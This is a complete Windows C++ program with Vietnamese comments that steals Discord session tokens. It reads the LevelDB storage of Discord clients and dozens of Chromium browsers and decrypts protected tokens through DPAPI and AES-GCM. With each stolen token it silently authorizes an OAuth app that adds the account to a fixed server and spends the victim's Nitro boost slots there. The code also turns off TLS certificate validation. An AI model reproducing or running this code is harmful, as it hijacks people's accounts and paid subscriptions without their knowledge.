// discord_pipeline.cpp
// Build (MSVC):
//   cl /std:c++17 /EHsc /O2 discord_pipeline.cpp /link winhttp.lib bcrypt.lib crypt32.lib
// Yêu cầu: Windows, C++17, MSVC 2019+
// Không cần thư viện ngoài.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlobj.h>

#include <iostream>
#include <string>
#include <vector>
#include <set>
#include <map>
#include <mutex>
#include <thread>
#include <atomic>
#include <chrono>
#include <regex>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

namespace fs = std::filesystem;

// ─────────────────────────────────────────────
//  CẤU HÌNH
// ─────────────────────────────────────────────

static const int         MAX_TOKENS_PER_RUN = 500;
static const int         MAX_WORKERS        = 3;
static const int         HTTP_TIMEOUT_MS    = 30000;
static const int         JOIN_WAIT_SEC      = 5;
static const bool        BOOST_ENABLED      = true;
static const bool        ENABLE_VERBOSE     = false;

static const std::wstring UA =
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    L"AppleWebKit/537.36 (KHTML, like Gecko) "
    L"discord/1.0.9007 Chrome/91.0.4472.164 "
    L"Electron/13.6.6 Safari/537.36";

static const std::string X_SUPER_PROPERTIES =
    "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5u"
    "ZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA3Iiwib3NfdmVyc2lvbiI6IjEw"
    "LjAuMTkwNDMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50"
    "X2J1aWxkX251bWJlciI6MTYxODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==";

static const std::string OAUTH_CLIENT_ID = "1484839018926444604";
static const std::string OAUTH_REDIRECT  = "https://restorecord.com/api/callback";
static const std::string OAUTH_SCOPE     = "identify guilds.join";
static const std::string OAUTH_STATE     = "1315263245120180266";

static const std::string TARGET_GUILD_ID = "1315263245120180266";

// ─────────────────────────────────────────────
//  LOG (thread-safe)
// ─────────────────────────────────────────────

static std::mutex g_log_mtx;

static std::string now_hms() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buf[16];
    sprintf_s(buf, sizeof(buf), "%02d:%02d:%02d",
              st.wHour, st.wMinute, st.wSecond);
    return buf;
}

static void info(const std::string& msg) {
    std::lock_guard<std::mutex> lk(g_log_mtx);
    std::cout << "[" << now_hms() << "] " << msg << std::endl;
}

static void dlog(const std::string& msg) {
    if (!ENABLE_VERBOSE) return;
    std::lock_guard<std::mutex> lk(g_log_mtx);
    std::cout << "[DEBUG][" << now_hms() << "] " << msg << std::endl;
}

// ─────────────────────────────────────────────
//  HTTP qua WinHTTP
// ─────────────────────────────────────────────

struct HttpResp {
    int status = 0;
    std::string body;
    std::string location;
    bool ok = false;
};

static std::wstring w(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring out(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &out[0], n);
    if (!out.empty() && out.back() == L'\0') out.pop_back();
    return out;
}

static std::string u8(const std::wstring& ws) {
    if (ws.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &out[0], n, nullptr, nullptr);
    if (!out.empty() && out.back() == '\0') out.pop_back();
    return out;
}

static std::string wstr_from_headers(HINTERNET hReq, DWORD header) {
    DWORD size = 0;
    WinHttpQueryHeaders(hReq, header, WINHTTP_HEADER_NAME_BY_INDEX,
                        WINHTTP_NO_OUTPUT_BUFFER, &size, WINHTTP_NO_HEADER_INDEX);
    if (size == 0) return "";
    std::wstring buf(size / sizeof(wchar_t), L'\0');
    if (!WinHttpQueryHeaders(hReq, header, WINHTTP_HEADER_NAME_BY_INDEX,
                             &buf[0], &size, WINHTTP_NO_HEADER_INDEX)) {
        return "";
    }
    return u8(buf.c_str());
}

// method: L"GET" | L"POST" | L"PUT"
static HttpResp http_request(const std::wstring& method,
                             const std::wstring& host,
                             const std::wstring& path,
                             const std::vector<std::pair<std::string, std::string>>& headers,
                             const std::string& body) {
    HttpResp out;
    HINTERNET hSession = WinHttpOpen(UA.c_str(),
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return out;
    WinHttpSetTimeouts(hSession, HTTP_TIMEOUT_MS, HTTP_TIMEOUT_MS,
                                 HTTP_TIMEOUT_MS, HTTP_TIMEOUT_MS);

    HINTERNET hConn = WinHttpConnect(hSession, host.c_str(),
                                     INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return out; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, method.c_str(), path.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hReq) {
        WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession);
        return out;
    }

    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    for (auto& kv : headers) {
        std::wstring line = w(kv.first) + L": " + w(kv.second) + L"\r\n";
        WinHttpAddRequestHeaders(hReq, line.c_str(), (DWORD)-1L,
            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    }

    BOOL sent = WinHttpSendRequest(
        hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        body.empty() ? nullptr : (LPVOID)body.data(),
        (DWORD)body.size(), (DWORD)body.size(), 0);

    if (sent && WinHttpReceiveResponse(hReq, nullptr)) {
        DWORD code = 0, sz = sizeof(code);
        WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &code, &sz, WINHTTP_NO_HEADER_INDEX);
        out.status = (int)code;
        out.location = wstr_from_headers(hReq, WINHTTP_QUERY_LOCATION);

        DWORD avail = 0;
        do {
            if (!WinHttpQueryDataAvailable(hReq, &avail) || avail == 0) break;
            std::vector<char> buf(avail);
            DWORD read = 0;
            if (WinHttpReadData(hReq, buf.data(), avail, &read)) {
                out.body.append(buf.data(), read);
            }
        } while (avail > 0);
        out.ok = true;
    } else {
        dlog("HTTP send/recv failed, err=" + std::to_string(GetLastError()));
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSession);
    return out;
}

static std::vector<std::pair<std::string, std::string>>
base_headers(const std::string& token) {
    return {
        {"accept", "*/*"},
        {"authorization", token},
        {"x-super-properties", X_SUPER_PROPERTIES},
    };
}

static std::string url_encode(const std::string& s) {
    static const char* hex = "0123456789ABCDEF";
    std::string out;
    for (unsigned char c : s) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            out.push_back((char)c);
        } else if (c == ' ') {
            out.push_back('+');
        } else {
            out.push_back('%');
            out.push_back(hex[c >> 4]);
            out.push_back(hex[c & 0xF]);
        }
    }
    return out;
}

// ─────────────────────────────────────────────
//  DPAPI + MASTER KEY + AES-256-GCM
// ─────────────────────────────────────────────

static std::vector<BYTE> b64_decode(const std::string& s) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(s.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &len, nullptr, nullptr) || len == 0)
        return {};
    std::vector<BYTE> out(len);
    CryptStringToBinaryA(s.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &len, nullptr, nullptr);
    out.resize(len);
    return out;
}

static std::vector<BYTE> dpapi_decrypt(const std::vector<BYTE>& in) {
    if (in.empty()) return {};
    DATA_BLOB inBlob{ (DWORD)in.size(), (BYTE*)in.data() };
    DATA_BLOB outBlob{ 0, nullptr };
    if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob))
        return {};
    std::vector<BYTE> out(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return out;
}

static std::vector<BYTE> get_master_key(const std::string& user_data_root) {
    std::string path = user_data_root + "\\Local State";
    std::ifstream f(path, std::ios::binary);
    if (!f) return {};
    std::string content((std::istreambuf_iterator<char>(f)), {});
    const std::string needle = "\"encrypted_key\":\"";
    auto p = content.find(needle);
    if (p == std::string::npos) return {};
    p += needle.size();
    auto e = content.find('"', p);
    if (e == std::string::npos) return {};
    std::string b64 = content.substr(p, e - p);
    auto raw = b64_decode(b64);
    if (raw.size() < 5) return {};
    std::vector<BYTE> dpapi(raw.begin() + 5, raw.end());
    return dpapi_decrypt(dpapi);
}

static std::string aes_gcm_decrypt(const std::string& enc, const std::vector<BYTE>& key) {
    if (key.empty()) return "";
    const std::string prefix = "dQw4w9WgXcQ:";
    if (enc.size() < prefix.size() || enc.substr(0, prefix.size()) != prefix) return "";
    std::string b64 = enc.substr(prefix.size());
    while (!b64.empty() && (b64.back() == ' ' || b64.back() == '\r' ||
                            b64.back() == '\n' || b64.back() == '\0'))
        b64.pop_back();
    auto raw = b64_decode(b64);
    if (raw.size() < 3 + 12 + 1 + 16) return "";

    std::vector<BYTE> nonce(raw.begin() + 3, raw.begin() + 15);
    std::vector<BYTE> cipher(raw.begin() + 15, raw.end() - 16);
    std::vector<BYTE> tag(raw.end() - 16, raw.end());

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    std::string result;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return "";
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
        (PBYTE)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
    BCRYPT_INIT_AUTH_MODE_INFO(auth);
    auth.pbNonce = nonce.data();
    auth.cbNonce = (ULONG)nonce.size();
    auth.pbTag = tag.data();
    auth.cbTag = (ULONG)tag.size();

    ULONG cbOut = 0;
    std::vector<BYTE> plain(cipher.size());
    NTSTATUS st = BCryptDecrypt(hKey, cipher.data(), (ULONG)cipher.size(),
        &auth, nullptr, 0, plain.data(), (ULONG)plain.size(), &cbOut, 0);
    if (BCRYPT_SUCCESS(st)) {
        result.assign(plain.begin(), plain.begin() + cbOut);
    }
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// ─────────────────────────────────────────────
//  ĐỌC FILE BỊ KHÓA (LevelDB đang mở)
// ─────────────────────────────────────────────

static std::string read_locked_file(const std::string& path) {
    HANDLE h = CreateFileA(path.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return "";

    LARGE_INTEGER sz;
    if (!GetFileSizeEx(h, &sz) || sz.QuadPart == 0 || sz.QuadPart > 50LL * 1024 * 1024) {
        CloseHandle(h); return "";
    }
    std::string content((size_t)sz.QuadPart, '\0');
    DWORD read = 0;
    ReadFile(h, &content[0], (DWORD)sz.QuadPart, &read, nullptr);
    CloseHandle(h);
    content.resize(read);
    return content;
}

// ─────────────────────────────────────────────
//  TRÍCH XUẤT TOKEN
// ─────────────────────────────────────────────

static bool looks_like_real_token(const std::string& tok) {
    auto a = tok.find('.');
    if (a == std::string::npos) return false;
    auto b = tok.find('.', a + 1);
    if (b == std::string::npos) return false;
    if (tok.find('.', b + 1) != std::string::npos) return false;

    // phần đầu base64url phải decode ra chữ số
    std::string first = tok.substr(0, a);
    // đệm '='
    while (first.size() % 4) first.push_back('=');
    DWORD len = 0;
    if (!CryptStringToBinaryA(first.c_str(), 0, CRYPT_STRING_BASE64_ANY,
                              nullptr, &len, nullptr, nullptr) || len == 0)
        return false;
    std::vector<BYTE> raw(len);
    if (!CryptStringToBinaryA(first.c_str(), 0, CRYPT_STRING_BASE64_ANY,
                              raw.data(), &len, nullptr, nullptr))
        return false;
    for (DWORD i = 0; i < len; ++i) {
        if (raw[i] < '0' || raw[i] > '9') return false;
    }
    return true;
}

static void extract_tokens(const std::string& content,
                           const std::vector<BYTE>& key,
                           std::set<std::string>& out) {
    static const std::regex re_std(R"([\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38})");
    static const std::regex re_mfa(R"(mfa\.[\w-]{84})");
    static const std::regex re_enc(R"(dQw4w9WgXcQ:[A-Za-z0-9+/=]+)");

    for (auto it = std::sregex_iterator(content.begin(), content.end(), re_std);
         it != std::sregex_iterator(); ++it) {
        if (looks_like_real_token(it->str())) out.insert(it->str());
    }
    for (auto it = std::sregex_iterator(content.begin(), content.end(), re_mfa);
         it != std::sregex_iterator(); ++it) {
        out.insert(it->str());
    }
    if (!key.empty()) {
        for (auto it = std::sregex_iterator(content.begin(), content.end(), re_enc);
             it != std::sregex_iterator(); ++it) {
            auto dec = aes_gcm_decrypt(it->str(), key);
            if (!dec.empty()) out.insert(dec);
        }
    }
}

static void scan_leveldb(const std::string& dir,
                         const std::vector<BYTE>& key,
                         std::set<std::string>& out) {
    std::error_code ec;
    if (!fs::is_directory(dir, ec)) return;
    for (auto& entry : fs::recursive_directory_iterator(dir,
            fs::directory_options::skip_permission_denied, ec)) {
        if (ec) { ec.clear(); continue; }
        if (!entry.is_regular_file(ec)) continue;
        auto ext = entry.path().extension().string();
        if (ext != ".log" && ext != ".ldb") continue;
        std::string content = read_locked_file(entry.path().string());
        if (!content.empty()) extract_tokens(content, key, out);
    }
}

// ─────────────────────────────────────────────
//  OAUTH2
// ─────────────────────────────────────────────

struct OAuthResult {
    bool ok = false;
    std::string location;
    std::string code;
    std::string state;
    std::string error;
};

static std::string query_param(const std::string& url, const std::string& key) {
    auto qpos = url.find('?');
    if (qpos == std::string::npos) return "";
    std::string q = url.substr(qpos + 1);
    std::string needle = key + "=";
    size_t p = 0;
    while ((p = q.find(needle, p)) != std::string::npos) {
        if (p == 0 || q[p - 1] == '&') {
            size_t vstart = p + needle.size();
            size_t vend = q.find('&', vstart);
            return q.substr(vstart, vend == std::string::npos ? vend : vend - vstart);
        }
        p += needle.size();
    }
    return "";
}

static OAuthResult oauth2_authorize(const std::string& token) {
    OAuthResult r;
    if (token.empty()) { r.error = "token rỗng"; return r; }

    std::string query =
        "client_id=" + OAUTH_CLIENT_ID +
        "&response_type=code" +
        "&redirect_uri=" + url_encode(OAUTH_REDIRECT) +
        "&scope=" + url_encode(OAUTH_SCOPE) +
        "&state=" + OAUTH_STATE +
        "&prompt=none";
    std::wstring path = L"/api/v9/oauth2/authorize?" + w(query);

    auto hdr = base_headers(token);
    hdr.push_back({"content-type", "application/json"});

    // GET mồi (Discord yêu cầu)
    http_request(L"GET", L"discord.com", path, hdr, "");

    std::string body = "{\"permissions\":\"0\",\"authorize\":true}";
    auto resp = http_request(L"POST", L"discord.com", path, hdr, body);

    if (!resp.ok || resp.status < 200 || resp.status >= 300) {
        r.error = "HTTP " + std::to_string(resp.status) + ": " + resp.body.substr(0, 200);
        return r;
    }

    // Tìm location trong JSON (nếu server trả body)
    std::string location = resp.location;
    if (location.empty()) {
        auto p = resp.body.find("\"location\":\"");
        if (p != std::string::npos) {
            p += 12;
            auto e = resp.body.find('"', p);
            if (e != std::string::npos) location = resp.body.substr(p, e - p);
        }
    }
    if (location.empty()) {
        r.error = "Không có location. Body: " + resp.body.substr(0, 200);
        return r;
    }
    r.location = location;

    std::string code = query_param(location, "code");
    std::string state = query_param(location, "state");
    if (!code.empty()) { r.code = code; r.state = state; r.ok = true; }
    else r.error = "location không chứa code: " + location.substr(0, 200);

    // Gọi callback RestoreCord nếu có
    if (location.find("restorecord.com") != std::string::npos) {
        std::wstring host = L"restorecord.com";
        std::wstring p2 = w(location.substr(location.find("/api/")));
        http_request(L"GET", host, p2,
            {{"user-agent", u8(UA)},
             {"accept", "application/json,text/html;q=0.9,*/*;q=0.8"}}, "");
    }
    return r;
}

// ─────────────────────────────────────────────
//  CHECK JOIN / BOOST
// ─────────────────────────────────────────────

static bool is_in_guild(const std::string& token, const std::string& gid) {
    auto resp = http_request(L"GET", L"discord.com",
        L"/api/v10/users/@me/guilds", base_headers(token), "");
    if (!resp.ok || resp.status != 200) return false;
    std::string needle = "\"id\":\"" + gid + "\"";
    std::string needle2 = "\"id\": \"" + gid + "\"";
    return resp.body.find(needle) != std::string::npos ||
           resp.body.find(needle2) != std::string::npos;
}

static std::vector<std::string> get_slot_ids(const std::string& token) {
    auto resp = http_request(L"GET", L"discord.com",
        L"/api/v9/users/@me/guilds/premium/subscription-slots",
        base_headers(token), "");
    std::vector<std::string> ids;
    if (!resp.ok || resp.status != 200) return ids;

    static const std::regex re(R"("id"\s*:\s*"(\d+)")");
    for (auto it = std::sregex_iterator(resp.body.begin(), resp.body.end(), re);
         it != std::sregex_iterator(); ++it) {
        ids.push_back((*it)[1].str());
    }
    return ids;
}

static int boost_guild(const std::string& token, const std::string& gid) {
    auto slots = get_slot_ids(token);
    if (slots.empty()) return 0;

    int success = 0;
    for (size_t i = 0; i < slots.size(); ++i) {
        std::string body = "{\"user_premium_guild_subscription_slot_ids\":[\"" +
                           slots[i] + "\"]}";
        std::wstring path = L"/api/v9/guilds/" + w(gid) + L"/premium/subscriptions";
        auto hdr = base_headers(token);
        hdr.push_back({"content-type", "application/json"});
        auto resp = http_request(L"PUT", L"discord.com", path, hdr, body);

        if (resp.status == 200 || resp.status == 201) {
            success++;
            info("    [+] Boost slot " + std::to_string(i + 1) + " OK");
        } else if (resp.status == 400) {
            info("    [-] Slot " + std::to_string(i + 1) + " đã dùng");
        } else {
            info("    [-] Slot " + std::to_string(i + 1) +
                 " HTTP " + std::to_string(resp.status));
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    return success;
}

// ─────────────────────────────────────────────
//  JSON — lấy string đơn giản
// ─────────────────────────────────────────────

static std::string json_str(const std::string& j, const std::string& key) {
    std::string needle = "\"" + key + "\":";
    auto p = j.find(needle);
    if (p == std::string::npos) return "";
    p += needle.size();
    while (p < j.size() && j[p] == ' ') p++;
    if (p >= j.size()) return "";
    if (j[p] == '"') {
        p++;
        std::string out;
        while (p < j.size() && j[p] != '"') {
            if (j[p] == '\\' && p + 1 < j.size()) { out.push_back(j[p + 1]); p += 2; }
            else out.push_back(j[p++]);
        }
        return out;
    }
    auto e = j.find_first_of(",}\n", p);
    return j.substr(p, e == std::string::npos ? std::string::npos : e - p);
}

// ─────────────────────────────────────────────
//  STATS + WORKER
// ─────────────────────────────────────────────

struct Stats {
    std::atomic<int> valid{0};
    std::atomic<int> oauth_ok{0};
    std::atomic<int> joined{0};
    std::atomic<int> boosted{0};
    std::atomic<int> failed{0};
    std::atomic<int> picked{0};
};
static Stats g_stats;

static void process_token(const std::string& tok) {
    // 1) Validate
    auto me = http_request(L"GET", L"discord.com",
        L"/api/v10/users/@me", base_headers(tok), "");
    if (!me.ok || me.status != 200) return;
    std::string uid = json_str(me.body, "id");
    std::string uname = json_str(me.body, "username");
    std::string disc = json_str(me.body, "discriminator");
    if (uid.empty()) return;

    g_stats.valid++;
    std::string display = uname + (disc != "0" && !disc.empty() ? "#" + disc : "");
    info("[v] Valid UID " + uid + " (" + display + ") tok=" + tok.substr(0, 10) + "...");

    // 2) OAuth
    auto o = oauth2_authorize(tok);
    if (!o.ok) {
        info("    [-] OAuth FAIL: " + o.error);
        g_stats.failed++;
        return;
    }
    g_stats.oauth_ok++;
    info("    [+] OAuth OK (state=" + o.state + ")");

    // 3) Đợi 5s
    info("    [*] Chờ " + std::to_string(JOIN_WAIT_SEC) + "s...");
    std::this_thread::sleep_for(std::chrono::seconds(JOIN_WAIT_SEC));

    // 4) Check join
    if (!is_in_guild(tok, TARGET_GUILD_ID)) {
        info("    [-] CHƯA vào guild " + TARGET_GUILD_ID);
        g_stats.failed++;
        return;
    }
    g_stats.joined++;
    info("    [+] Đã vào guild " + TARGET_GUILD_ID);

    // 5) Boost
    if (BOOST_ENABLED) {
        int n = boost_guild(tok, TARGET_GUILD_ID);
        if (n > 0) {
            g_stats.boosted += n;
            info("    [+] Boost x" + std::to_string(n) + " OK");
        } else {
            info("    [-] Boost FAIL (0 slot)");
            g_stats.failed++;
        }
    }
}

// ─────────────────────────────────────────────
//  QUÉT DISCORD CLIENT + TRÌNH DUYỆT
// ─────────────────────────────────────────────

struct BrowserDef {
    const char* name;
    const char* rel;
    bool from_appdata;
    bool is_opera;   // Opera dùng leveldb ngay dưới root
};

static const std::vector<BrowserDef> BROWSERS = {
    {"Chrome",        "Google\\Chrome",                          false, false},
    {"Edge",          "Microsoft\\Edge",                         false, false},
    {"Brave",         "BraveSoftware\\Brave-Browser",            false, false},
    {"Opera",         "Opera Software\\Opera Stable",            true,  true },
    {"Opera GX",      "Opera Software\\Opera GX Stable",         true,  true },
    {"Vivaldi",       "Vivaldi",                                 false, false},
    {"Yandex",        "Yandex\\YandexBrowser",                   false, false},
    {"Chromium",      "Chromium",                                false, false},
    {"Epic",          "Epic Privacy Browser",                    false, false},
    {"Iridium",       "Iridium",                                 false, false},
    {"360Chrome",     "360Chrome\\Chrome",                       false, false},
    {"360Safe",       "360se6\\User Data",                       false, false},
    {"QQ",            "Tencent\\QQBrowser\\User Data",           false, false},
    {"Baidu",         "Baidu\\BaiduBrowser\\User Data",          false, false},
    {"Sogou",         "SogouExplorer\\Webkit",                   false, false},
    {"Maxthon",       "Maxthon3\\Users",                         false, false},
    {"UC",            "UCBrowser\\User Data",                    false, false},
    {"Liebao",        "Liebao\\User Data",                       false, false},
    {"CocCoc",        "CocCoc\\Browser\\User Data",              false, false},
    {"Slimjet",       "Slimjet\\User Data",                      false, false},
    {"SlimBrowser",   "SlimBrowser\\User Data",                  false, false},
    {"Torch",         "Torch\\User Data",                        false, false},
    {"ComodoDragon",  "Comodo\\Dragon\\User Data",               false, false},
    {"ComodoIce",     "Comodo\\IceDragon\\User Data",            false, false},
    {"Iron",          "SRWare Iron\\User Data",                  false, false},
    {"Citrio",        "Citrio\\User Data",                       false, false},
    {"Orbitum",       "Orbitum\\User Data",                      false, false},
    {"Amigo",         "Amigo\\User Data",                        false, false},
    {"RockMelt",      "RockMelt\\User Data",                     false, false},
    {"Flock",         "Flock\\Browser\\User Data",               false, false},
    {"CoolNovo",      "CoolNovo\\User Data",                     false, false},
    {"BaiduSpark",    "Baidu Spark\\User Data",                  false, false},
    {"Tungsten",      "Tungsten\\User Data",                     false, false},
    {"Mustang",       "Mustang\\User Data",                      false, false},
    {"QIP Surf",      "QIP Surf\\User Data",                     false, false},
    {"Coowon",        "Coowon\\User Data",                       false, false},
    {"Deepnet",       "Deepnet Explorer\\User Data",             false, false},
    {"Staff",         "Staff\\User Data",                        false, false},
    {"Rambler",       "Rambler\\User Data",                      false, false},
    {"Nichrome",      "Nichrome\\User Data",                     false, false},
    {"Titan",         "Titan Browser\\User Data",                false, false},
    {"Chedot",        "Chedot\\User Data",                       false, false},
    {"7Star",         "7Star\\7Star\\User Data",                 false, false},
    {"CentBrowser",   "CentBrowser\\User Data",                  false, false},
    {"CheBrowser",    "CheBrowser\\User Data",                   false, false},
    {"Elements",      "Elements Browser\\User Data",             false, false},
    {"Superbird",     "Superbird\\User Data",                    false, false},
    {"GhostBrowser",  "GhostBrowser\\User Data",                 false, false},
    {"Avast",         "AVAST Software\\Browser\\User Data",      false, false},
    {"AVG",           "AVG\\Browser\\User Data",                 false, false},
    {"CCleaner",      "CCleaner Browser\\User Data",             false, false},
};

static const std::set<std::string> SYSTEM_SKIP = {
    "SystemTemp", "Crashpad", "GrShaderCache", "ShaderCache",
    "MEIPreload", "SSLErrorAssistant", "Subresource Filter",
    "ZxcvbnData", "NativeMessagingHosts", "Safe Browsing",
    "WidevineCdm", "OptimizationHints", "segmentation_platform",
    "CertificateRevocation",
};

static void scan_browser(const std::string& root, const BrowserDef& bd,
                         std::set<std::string>& found) {
    std::error_code ec;
    if (!fs::is_directory(root, ec)) return;
    auto root_key = get_master_key(root);

    if (bd.is_opera) {
        std::string ldb = root + "\\Local Storage\\leveldb";
        scan_leveldb(ldb, root_key, found);
        return;
    }

    for (auto& entry : fs::directory_iterator(root,
            fs::directory_options::skip_permission_denied, ec)) {
        if (ec) { ec.clear(); continue; }
        if (!entry.is_directory(ec)) continue;
        std::string name = entry.path().filename().string();
        if (SYSTEM_SKIP.count(name)) continue;

        std::string ldb = entry.path().string() + "\\Local Storage\\leveldb";
        if (!fs::is_directory(ldb, ec)) continue;

        auto key = get_master_key(entry.path().string());
        if (key.empty()) key = root_key;
        if (key.empty()) continue;
        scan_leveldb(ldb, key, found);
    }
}

static void scan_discord_clients(std::set<std::string>& found) {
    char appdata[MAX_PATH] = {};
    char localappdata[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata);
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localappdata);
    std::string sA = appdata, sL = localappdata;

    std::vector<std::pair<std::string, std::string>> clients = {
        {"Discord", sA + "\\Discord"},
        {"Discord", sL + "\\Discord"},
        {"Discord Canary", sA + "\\discordcanary"},
        {"Discord Canary", sL + "\\discordcanary"},
        {"Discord PTB", sA + "\\discordptb"},
        {"Discord PTB", sL + "\\discordptb"},
        {"Discord PTB", sA + "\\DiscordPTB"},
        {"Discord PTB", sL + "\\DiscordPTB"},
        {"Lightcord", sA + "\\Lightcord"},
        {"ArmCord", sA + "\\ArmCord"},
    };
    std::set<std::string> scanned;
    for (auto& c : clients) {
        if (scanned.count(c.second)) continue;
        scanned.insert(c.second);
        if (!fs::is_directory(c.second)) continue;
        auto key = get_master_key(c.second);
        std::string ldb = c.second + "\\Local Storage\\leveldb";
        scan_leveldb(ldb, key, found);
    }
}

// ─────────────────────────────────────────────
//  PIPELINE CHÍNH
// ─────────────────────────────────────────────

int main() {
    SetConsoleOutputCP(CP_UTF8);
    info("[*] Quét token Discord...");

    std::set<std::string> found;
    scan_discord_clients(found);

    char appdata[MAX_PATH] = {};
    char localappdata[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata);
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localappdata);
    std::string sA = appdata, sL = localappdata;

    for (auto& bd : BROWSERS) {
        std::string root = (bd.from_appdata ? sA : sL) + "\\" + bd.rel;
        scan_browser(root, bd, found);
    }

    info("[*] Tìm thấy " + std::to_string(found.size()) +
         " token ứng viên. Xử lý tối đa " +
         std::to_string(MAX_TOKENS_PER_RUN) +
         " với " + std::to_string(MAX_WORKERS) + " worker.");

    if (found.empty()) return 0;

    std::vector<std::string> candidates(found.begin(), found.end());
    if ((int)candidates.size() > MAX_TOKENS_PER_RUN)
        candidates.resize(MAX_TOKENS_PER_RUN);

    std::mutex seen_mtx;
    std::set<std::string> seen_uids;

    auto worker = [&]() {
        while (true) {
            std::string tok;
            {
                std::lock_guard<std::mutex> lk(seen_mtx);
                if (g_stats.picked >= (int)candidates.size()) return;
                tok = candidates[g_stats.picked++];
            }
            // dedup UID nhanh
            auto me = http_request(L"GET", L"discord.com",
                L"/api/v10/users/@me", base_headers(tok), "");
            if (!me.ok || me.status != 200) continue;
            std::string uid = json_str(me.body, "id");
            if (uid.empty()) continue;
            {
                std::lock_guard<std::mutex> lk(seen_mtx);
                if (seen_uids.count(uid)) continue;
                seen_uids.insert(uid);
            }
            process_token(tok);
        }
    };

    std::vector<std::thread> threads;
    for (int i = 0; i < MAX_WORKERS; ++i)
        threads.emplace_back(worker);
    for (auto& t : threads) t.join();

    std::cout << "\n";
    info("===== KẾT QUẢ =====");
    info("Valid   : " + std::to_string((int)g_stats.valid));
    info("OAuth OK: " + std::to_string((int)g_stats.oauth_ok));
    info("Joined  : " + std::to_string((int)g_stats.joined));
    info("Boosted : " + std::to_string((int)g_stats.boosted) + " slot");
    info("Failed  : " + std::to_string((int)g_stats.failed));
    return 0;
}
